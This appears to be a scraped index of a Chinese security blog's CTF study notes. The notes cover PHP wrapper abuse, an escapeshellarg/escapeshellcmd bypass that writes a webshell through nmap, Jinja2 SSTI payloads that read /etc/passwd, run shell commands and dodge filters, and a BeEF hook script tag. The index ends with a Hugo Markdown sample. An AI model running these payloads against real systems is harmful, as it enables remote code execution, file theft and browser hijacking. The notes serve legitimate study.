PHP提供了多种伪协议，每种伪协议都有其特定的用途和功能。\nfile:// 一般用于访问本地文件\n绝对路径、相对路径、网络路径 1 2 3 ?file=file:///etc/passswd ?url=/?url=file:///var/www/html/index.php # 访问index.php php:// 访问各个输入输出流\n常用： php://filter 用于读取源码，php://input 用于执行php代码\n1 2 3 4 5 6 7 8 9 # base64 输出 php://filter/read=convert.base64-encode/resource=[文件名] # 适用于 include 读文件 # 在数据流中写入 POST 的数据 php://input # 读取实例 ?cmd=php://filter/read=convert.base64-encode/resource=[文件名] data:// 数据流封装器，以传递相应格式的数据。可以用来执行PHP代码。一般需要用到base64编码传输。\n1 2 ?file=data://text/plain,xxxx ?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b 实例 1 file_get_contents($text,\u0026#39;r\u0026#39;)===\u0026#34;welcome to the zjctf\u0026#34; 要求从文件里读取字符串，与 welcome to the zjctf 相等 可以用 data:// 和 php:// 协议，将数据流重定向到用户可以控制的输入流\n构造 payload:\n1 2 3 4 5 6 7 ?text=data://text/plain,welcome to the zjctf # 相当于 封装了一个虚拟的文件 内容是 welcome to the zjctf # 或者 ?text=php://input # 同时 POST数据：welcome to the zjctf escapeshellarg 和 escapeshellcmd escapeshellarg 0x02 escapeshellarg为什么没有奏效？ 浅谈escapeshellarg逃逸与参数注入 \\[ Mi1k7ea \\] escapeshellarg 会给没有单引号的字符串加上单引号；对于有单引号的字符串，会先对单引号转义，再以单引号为分割，对各部分的字符串加上单引号。\n测试功能：\n1 2 3 4 5 6 7 8 \u0026lt;?php $str1 = \u0026#34;ls\u0026#34;; $str2 = \u0026#34;ls -al\u0026#34;; $str3 = \u0026#34;ls\u0026#39;zj\u0026#34;; var_dump(escapeshellarg($str1)); var_dump(escapeshellarg($str2)); var_dump(escapeshellarg($str3)); ?\u0026gt; 结果：\n1 2 3 string(4) \u0026#34;\u0026#39;ls\u0026#39;\u0026#34; string(8) \u0026#34;\u0026#39;ls -al\u0026#39;\u0026#34; string(10) \u0026#34;\u0026#39;ls\u0026#39;\\\u0026#39;\u0026#39;zj\u0026#39;\u0026#34; escapeshellcmd 反斜线\\ 会在以下字符之前插入：\n1 \u0026amp;#;`|*?~\u0026lt;\u0026gt;^()[]{}$\\ \\x0A \\xFF 不成对的引号也会被转义 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替 测试：\n1 2 3 4 5 6 7 8 \u0026lt;?php $str1 = \u0026#34;ls\u0026#34;; $str2 = \u0026#34;ls;\u0026#34;; $str3 = \u0026#34;\u0026#39;;ls;\u0026#34;; var_dump(escapeshellcmd($str1)); var_dump(escapeshellcmd($str2)); var_dump(escapeshellcmd($str3)); ?\u0026gt; 结果：\n1 2 3 string(2) \u0026#34;ls\u0026#34; string(4) \u0026#34;ls\\;\u0026#34; string(8) \u0026#34;\\\u0026#39;\\;ls\\;\u0026#34; 对于 arg + cmd 的参数注入 测试：\n1 2 3 4 5 \u0026lt;?php $str1 = \u0026#34;zj\u0026#39; -l \u0026#34;; system(escapeshellcmd(\u0026#34;ls --ignore=\u0026#34;.escapeshellarg($str1).\u0026#34; /tmp\u0026#34;)); echo escapeshellcmd(\u0026#34;ls --ignore=\u0026#34;.escapeshellarg($str1).\u0026#34; /tmp\u0026#34;); ?\u0026gt; ignore 参数需要 linux 环境 结果： ls --ignore='zj'\\\\'' -l \\' /tmp 可化简 ls --ignore=zj\\ -l ' /tmp 当用户输入包含单引号时，先用 escapeshellarg() 处理会给该单引号添加转义符，再用 escapeshellcmd() 处理时会将该添加的转义符再添加一个转义符，从而导致注入内容可以从==shellarg的单引号中逃逸掉==，造成后续可以进一步利用的参数注入漏洞。\n如果是先用escapeshellcmd()函数过滤，再用escapeshellarg()函数过滤，则不存在参数注入漏洞 实战： BUUCTF 2018\u0026mdash;Online Tool 1 2 3 4 5 6 \u0026lt;?php $host = $_GET[\u0026#39;host\u0026#39;]; $host = escapeshellarg($host); $host = escapeshellcmd($host); echo system(\u0026#34;nmap -T5 -sT -Pn --host-timeout 2 -F \u0026#34;.$host); ?\u0026gt; payload：\n1 ?host=2.2.2.2\u0026#39;\u0026lt;?php echo `cat /flag`;?\u0026gt; -oG test.php\u0026#39; -oG 是 nmap 的参数，表示写入前一个参数的内容到后一个参数所指明的文件中 变量覆盖 例题 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 \u0026lt;?php include \u0026#39;flag.php\u0026#39;; $yds = \u0026#34;dog\u0026#34;; $is = \u0026#34;cat\u0026#34;; $handsome = \u0026#39;yds\u0026#39;; foreach($_POST as $x =\u0026gt; $y){ $$x = $y; } foreach($_GET as $x =\u0026gt; $y){ $$x = $$y; } foreach($_GET as $x =\u0026gt; $y){ if($_GET[\u0026#39;flag\u0026#39;] === $x \u0026amp;\u0026amp; $x !== \u0026#39;flag\u0026#39;){ exit($handsome); } } if(!isset($_GET[\u0026#39;flag\u0026#39;]) \u0026amp;\u0026amp; !isset($_POST[\u0026#39;flag\u0026#39;])){ exit($yds); } if($_POST[\u0026#39;flag\u0026#39;] === \u0026#39;flag\u0026#39; || $_GET[\u0026#39;flag\u0026#39;] === \u0026#39;flag\u0026#39;){ exit($is); } echo \u0026#34;the flag is: \u0026#34;.$flag; ?\u0026gt; payload：\n1 ?is=flag\u0026amp;flag=flag 尝试 1. 直接从 echo 输出 2. 从 yds 输出 都不行，被几个 if 条件限制住了，只能从 is 输出。\n","date":"2024-10-04T01:45:39+08:00","permalink":"https://bu44er.ink/p/8hg4xmol/","title":"php代码审计"},{"content":"SSTI （Server-Side Template Injection）服务器端模板注入\n特征：\n网站能够返回用户的自定义内容，并以一种“模板”的形式 {} 背景 模板的诞生是为了将显示与数据分离，模板技术多种多样，但其本质是将模板文件和数据通过模板引擎生成最终的HTML代码。\n通俗理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。 常见模板有：\npython框架 jinja2 mako tornado django PHP框架 smarty twig java框架 jade velocity 这些框架使用渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞。\nflask 基础 常见的基于Python的模板 实例：最小的 flask 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 from flask import Flask # 导入Flask类.用于后面实例化出一个WSGI应用程序. app = Flask(__name__) # 创建Flask实例,传入的第一个参数为模块或包名. @app.route(\u0026#39;/\u0026#39;) # route 装饰器的作用是将函数与url绑定起来，即把 helloworld 这个函数与根目录绑定 # 使用 route() 装饰器告诉 Flask 什么样的 URL 能触发我们的函数 def hello_world(): # put application\u0026#39;s code here return \u0026#39;Hello World!\u0026#39; if __name__ == \u0026#39;__main__\u0026#39;: app.run() # app.run()函数让应用在本地启动 route 装饰器的作用是将函数与url绑定起来 python3执行：\n1 2 3 4 5 6 python3 hello.py * Serving Flask app \u0026#39;hello\u0026#39; * Debug mode: off WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Running on http://127.0.0.1:5000 Press CTRL+C to quit 渲染方法 flask的渲染方法有 render_template 和 render_template_string 两种。\nrender_template() 是用来渲染一个指定的文件的：\n1 return render_template(\u0026#39;index.html\u0026#39;) render_template_string 则是用来渲染一个字符串的，SSTI与这个方法密不可分。\n1 2 html = \u0026#39;\u0026lt;h1\u0026gt;This is index page\u0026lt;/h1\u0026gt;\u0026#39; return render_template_string(html) route 装饰器路由 使用route()装饰器告诉Flask什么样的URL能触发我们的函数。\n1 @app.route(\u0026#39;/\u0026#39;) .route()装饰器把一个函数绑定到对应的URL上，这句话相当于路由，一个路由跟随一个函数。\n1 2 3 @app.route(\u0026#39;/\u0026#39;) def test(): return 123 此外还可以设置动态网址\n1 2 3 @app.route(\u0026#34;/hello/\u0026lt;username\u0026gt;\u0026#34;) def hello_user(username): return \u0026#34;user:%s\u0026#34;%username ![[../../../../img/Pasted image 20240716152629.png|300]]\n重点：模板渲染 Flask的模板引擎是jinja2，文档可以参考这个\nhttps://svn.python.org/projects/external/Jinja-2.1.1 在网站的根目录下新建templates文件夹，用来存放模板文件。\n1 2 3 4 5 6 7 8 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;SSTI\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h3\u0026gt;Hello, {{name}}\u0026lt;/h3\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 模板文件使用 HTML 的语法，但并不是单纯的 HTML 代码，代码中==夹杂着模板的语法== {{}} 就是模板的语法，表示其中是需要渲染的内容 在Jinja2 ，用{{}} 作为变量包裹标识符，用{% ... %}表示指令 Jinja2 主要是 ==Python2== 的环境 此时我们写我们的模板渲染代码(app.py)，内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 from flask import Flask, request, render_template app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;,methods=[\u0026#39;GET\u0026#39;]) def hello_world(): query = request.args.get(\u0026#39;name\u0026#39;) # GET取参数name的值 return render_template(\u0026#39;test.html\u0026#39;, name=query) # 将name的值传入模板,进行渲染 if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#34;0.0.0.0\u0026#34;, port=30000, debug=True) # 让操作系统监听所有公网 IP,此时便可以在公网上看到自己的web，同时开启debug，方便调试。 文件结构： 测试结果： python 魔术方法 在Python的SSTI中，大部分是依靠 ==基类-\u0026gt;子类-\u0026gt;危险函数== 的方式来利用SSTI\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 __class__ 万物皆对象，class用于返回该对象所属的类，比如某个字符串，他的对象为字符串对象，而其所属的类为\u0026lt;class \u0026#39;str\u0026#39;\u0026gt; __mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 __base__ 以字符串返回一个类所直接继承的类。 __bases__ 以元组的形式返回一个类所直接继承的类。 // __base__和__mro__都是用来寻找基类的 __subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表，获取类的所有子类。 __init__ 类的初始化方法，所有自带带类都包含init方法，便于利用他当跳板来调用globals。 __globals__ 函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价 实例 1 2 3 4 5 6 7 # 寻找可用引用（子类） \u0026gt;\u0026gt;\u0026gt; \u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__() \u0026gt;\u0026gt;\u0026gt; [\u0026lt;type \u0026#39;type\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;weakref\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;weakcallableproxy\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;weakproxy\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;int\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;basestring\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;bytearray\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;list\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;NoneType\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;NotImplementedType\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;traceback\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;super\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;xrange\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;dict\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;set\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;slice\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;staticmethod\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;complex\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;float\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;buffer\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;long\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;frozenset\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;property\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;memoryview\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;tuple\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;enumerate\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;reversed\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;code\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;frame\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;builtin_function_or_method\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;instancemethod\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;function\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;classobj\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;dictproxy\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;generator\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;getset_descriptor\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;wrapper_descriptor\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;instance\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;ellipsis\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;member_descriptor\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;file\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;PyCapsule\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;cell\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;callable-iterator\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;iterator\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;sys.long_info\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;sys.float_info\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;EncodingMap\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;fieldnameiterator\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;formatteriterator\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;sys.version_info\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;sys.flags\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;exceptions.BaseException\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;module\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;imp.NullImporter\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;zipimport.zipimporter\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;posix.stat_result\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;posix.statvfs_result\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;warnings.WarningMessage\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;warnings.catch_warnings\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_weakrefset._IterationGuard\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_weakrefset.WeakSet\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_abcoll.Hashable\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;classmethod\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_abcoll.Iterable\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_abcoll.Sized\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_abcoll.Container\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_abcoll.Callable\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;dict_keys\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;dict_items\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;dict_values\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;site._Printer\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;site._Helper\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;_sre.SRE_Pattern\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;_sre.SRE_Match\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;_sre.SRE_Scanner\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;site.Quitter\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;codecs.IncrementalEncoder\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;codecs.IncrementalDecoder\u0026#39;\u0026gt;] # 可以看到有一个`\u0026lt;type \u0026#39;file\u0026#39;\u0026gt;` # payload: # \u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()[40](\u0026#39;/etc/passwd\u0026#39;).read() 直接的 XSS 注入 ssti.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 from flask import Flask, request, render_template_string app = Flask(__name__) @app.route(\u0026#39;/test/\u0026#39;) def test(): code = request.args.get(\u0026#39;id\u0026#39;) html = \u0026#39;\u0026#39;\u0026#39; \u0026lt;h3\u0026gt;%s\u0026lt;/h3\u0026gt; \u0026#39;\u0026#39;\u0026#39; % (code) return render_template_string(html) # run the app in localhost if __name__ == \u0026#39;__main__\u0026#39;: app.run() 直接 python3 运行这个文件即可 正常使用： ==注入==： 修改代码以避免直接的 XSS 注入：\n1 2 3 4 @app.route(\u0026#39;/test/\u0026#39;) def test(): code = request.args.get(\u0026#39;id\u0026#39;) return render_template_string(\u0026#39;\u0026lt;h1\u0026gt;{{ code }}\u0026lt;/h1\u0026gt;\u0026#39;,code=code) 用 {{}} 传递变量，模板引擎会对渲染的变量进行编码转义，所以不会执行恶意脚本，仅回显脚本内容 模板注入 文件读取/命令执行 {{}}并不仅仅可以传递变量，还可以执行一些简单的表达式。\n以上一个 part 的 ssti.py 代码为例，注入 id={{2*4}} : 一般思路：找到父类\u0026lt;type \u0026lsquo;object\u0026rsquo;\u0026gt;`\u0026ndash;\u0026gt;寻找子类\u0026ndash;\u0026gt;找关于命令执行或者文件操作的模块\n手工 payload 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 # 先 {{\u0026#39;\u0026#39;.__class__.__mro__[1].__subclasses__()}} 找子类 # index 函数返回子类的索引 {{\u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__().index(\u0026#39;file\u0026#39;)}} [].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index(\u0026#39;linecache\u0026#39;) # classified by subclasses # class warnings.catch_warnings -\u0026gt; linecache -\u0026gt; os {{[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()}} {{[].__class__.__base__.__subclasses__()[59].__init__.func_globals.values()[13][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls\u0026#34;).read()\u0026#39;)}} # rce\u0026#39;s result could be returned by curling # class site._Printer {{\u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\u0026#39;os\u0026#39;].listdir(\u0026#39;.\u0026#39;)}} # type \u0026#39;file\u0026#39; {{\u0026#39;\u0026#39;.__class__.__mro__[1].__subclasses__()[xx](\u0026#39;/etc/passwd\u0026#39;).read()}} # WarningMessage -\u0026gt; builtins -\u0026gt; file {{\u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;file\u0026#39;](\u0026#39;F://GetFlag.txt\u0026#39;).read()}} # WarningMessage -\u0026gt; builtins -\u0026gt; eval {{\u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;whoami\u0026#34;).read()\u0026#39;)}} # class \u0026#39;os._wrap_close\u0026#39; -\u0026gt; builtins -\u0026gt; chr 用于绕过 {% set chr= \u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]()[137][\u0026#39;_\u0026#39;\u0026#39;_in\u0026#39;\u0026#39;it_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_glo\u0026#39;\u0026#39;bals_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_bui\u0026#39;\u0026#39;ltins_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;chr\u0026#39;]%} {% set cmd=\u0026#39;cat \u0026#39;~chr(47)~\u0026#39;flag\u0026#39; %} # class \u0026#39;os._wrap_close\u0026#39; -\u0026gt; popen {%print(\u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]()[137][\u0026#39;_\u0026#39;\u0026#39;_in\u0026#39;\u0026#39;it_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_glo\u0026#39;\u0026#39;bals_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;po\u0026#39;\u0026#39;pen\u0026#39;](\u0026#39;pwd\u0026#39;)[\u0026#39;rea\u0026#39;\u0026#39;d\u0026#39;]())%} 比如 [xx] 表示 __subclasses__ 的第xx+1个 一般先扫目录找 flag 位置，再读 flag 文件 更自动的payload：\n1 2 3 4 5 6 7 8 9 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].eval(\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cd ..;ls;cat flag\u0026#39;).read()\u0026#34;)}}{% endif %}{% endfor %} {{ config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;cat /flag | base64\u0026#39;).read()}} # rce {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].eval(\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;id\u0026#39;).read()\u0026#34;) }}{% endif %}{% endfor %} # readfile {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;filename\u0026#39;, \u0026#39;r\u0026#39;).read()}}{% endif %}{% endfor %} 绕过 {{}} 过滤 {%print 123%}绕过{}\n. 过滤 使用 JinJa2 函数|attr()\n将request.__class__改成request|attr(\u0026quot;__class__\u0026quot;) [''] 绕过.\n1 {{\u0026#34;\u0026#34;.__class__}} = {{\u0026#34;\u0026#34;[\u0026#39;__class\u0026#39;]}} [] 过滤 pop 函数\n1 \u0026#39;\u0026#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(\u0026#39;/etc/passwd\u0026#39;).read() \u0026quot; 过滤 request.args 是flask中的一个属性，用 GET path 参数传递路径\n1 {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}\u0026amp;path=/etc/passwd request.args改为request.values则利用post的方式进行传参\n1 2 3 4 GET: {{ \u0026#39;\u0026#39;[request.value.class][request.value.mro][2][request.value.subclasses]()[40](\u0026#39;/etc/passwd\u0026#39;).read() }} POST: class=__class__\u0026amp;mro=__mro__\u0026amp;subclasses=__subclasses__ 关键字过滤 __getattribute__ base64 编码\n1 {{[].__getattribute__(\u0026#39;X19jbGFzc19f\u0026#39;.decode(\u0026#39;base64\u0026#39;)).__base__.__subclasses__()[40](\u0026#34;/etc/passwd\u0026#34;).read()}} 字符串拼接\n1 {{[].__getattribute__(\u0026#39;__c\u0026#39;+\u0026#39;lass__\u0026#39;).__base__.__subclasses__()[40](\u0026#34;/etc/passwd\u0026#34;).read()}} 关键字中插入一对单引号 ''，绕过对关键字的黑名单过滤\n1 BaseCTF{%print(\u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]()[137])%} / 过滤 builtins 的 chr 函数\nchr(47) 表示 / 1 2 3 4 5 {% set chr= \u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]()[137][\u0026#39;_\u0026#39;\u0026#39;_in\u0026#39;\u0026#39;it_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_glo\u0026#39;\u0026#39;bals_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_bui\u0026#39;\u0026#39;ltins_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;chr\u0026#39;]%} {% set cmd=\u0026#39;cat \u0026#39;~chr(47)~\u0026#39;flag\u0026#39; %} {%print(\u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]()[137][\u0026#39;_\u0026#39;\u0026#39;_in\u0026#39;\u0026#39;it_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_glo\u0026#39;\u0026#39;bals_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;po\u0026#39;\u0026#39;pen\u0026#39;](cmd)[\u0026#39;rea\u0026#39;\u0026#39;d\u0026#39;]())%} 参考 很清晰且基础的讲解： 从零学习flask模板注入 - FreeBuf网络安全行业门户 一些例题： CTF-SSTI | Extraderの博客 ","date":"2024-09-21T19:17:14+08:00","permalink":"https://bu44er.ink/p/6b9l0s6c/","title":"SSTI 漏洞"},{"content":"命令 1 2 3 4 # start beef-xss beef-xss-stop xss注入 1 \u0026lt;script src=\u0026#34;http://\u0026lt;kali-ip\u0026gt;:3000/hook.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 问题记录 beef 抓不到本地访问记录 ==要直连，不能用代理！！！==\n为什么不能用代理？\ngpt：代理服务器本身不在我的内网中，无法解析和访问内部地址\n","date":"2024-09-17T23:47:23+08:00","permalink":"https://bu44er.ink/p/0iug45d1/","title":"beef xss"},{"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings The following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution Tiam, ad mint andaepu dandae nostion secatur sequo quae. Note that you can use Markdown syntax within a blockquote.\nBlockquote with attribution Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.\n— Rob Pike1\nTables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\nName Age Bob 27 Alice 23 Inline Markdown within tables Italics Bold Code italics bold code A B C D E F Lorem ipsum dolor sit amet, consectetur adipiscing elit. Phasellus ultricies, sapien non euismod aliquam, dui ligula tincidunt odio, at accumsan nulla sapien eget ex. Proin eleifend dictum ipsum, non euismod ipsum pulvinar et. Vivamus sollicitudin, quam in pulvinar aliquam, metus elit pretium purus Proin sit amet velit nec enim imperdiet vehicula. Ut bibendum vestibulum quam, eu egestas turpis gravida nec Sed scelerisque nec turpis vel viverra. Vivamus vitae pretium sapien Code Blocks Code block with backticks 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; 